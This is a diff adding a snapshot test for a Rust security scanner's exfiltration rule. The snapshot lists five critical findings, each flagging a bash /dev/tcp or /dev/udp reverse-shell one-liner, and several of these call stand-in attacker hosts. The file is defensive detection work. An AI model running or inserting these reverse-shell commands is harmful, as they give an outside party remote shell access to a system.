@@ -1,0 +1,61 @@
+---
+source: src/rules/builtin/exfiltration.rs
+expression: findings
+---
+[
+  {
+    "id": "EX-015",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Bash /dev/tcp reverse shell",
+    "line": 6,
+    "code": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+    "message": "Reverse shell indicator: bash /dev/tcp or /dev/udp network redirection detected.",
+    "recommendation": "Artifacts must not open raw network sockets via /dev/tcp. Remove the reverse-shell construct and audit the surrounding script."
+  },
+  {
+    "id": "EX-015",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Bash /dev/tcp reverse shell",
+    "line": 7,
+    "code": "exec 5<>/dev/tcp/evil.example/443",
+    "message": "Reverse shell indicator: bash /dev/tcp or /dev/udp network redirection detected.",
+    "recommendation": "Artifacts must not open raw network sockets via /dev/tcp. Remove the reverse-shell construct and audit the surrounding script."
+  },
+  {
+    "id": "EX-015",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Bash /dev/tcp reverse shell",
+    "line": 8,
+    "code": "cat < /dev/tcp/attacker.com/80",
+    "message": "Reverse shell indicator: bash /dev/tcp or /dev/udp network redirection detected.",
+    "recommendation": "Artifacts must not open raw network sockets via /dev/tcp. Remove the reverse-shell construct and audit the surrounding script."
+  },
+  {
+    "id": "EX-015",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Bash /dev/tcp reverse shell",
+    "line": 9,
+    "code": "sh -c 'exec 196<>/dev/udp/1.2.3.4/53'",
+    "message": "Reverse shell indicator: bash /dev/tcp or /dev/udp network redirection detected.",
+    "recommendation": "Artifacts must not open raw network sockets via /dev/tcp. Remove the reverse-shell construct and audit the surrounding script."
+  },
+  {
+    "id": "EX-015",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Bash /dev/tcp reverse shell",
+    "line": 10,
+    "code": "/bin/bash -c \"bash -i >& /dev/tcp/127.0.0.1/9001 0>&1\"",
+    "message": "Reverse shell indicator: bash /dev/tcp or /dev/udp network redirection detected.",
+    "recommendation": "Artifacts must not open raw network sockets via /dev/tcp. Remove the reverse-shell construct and audit the surrounding script."
+  }
+]
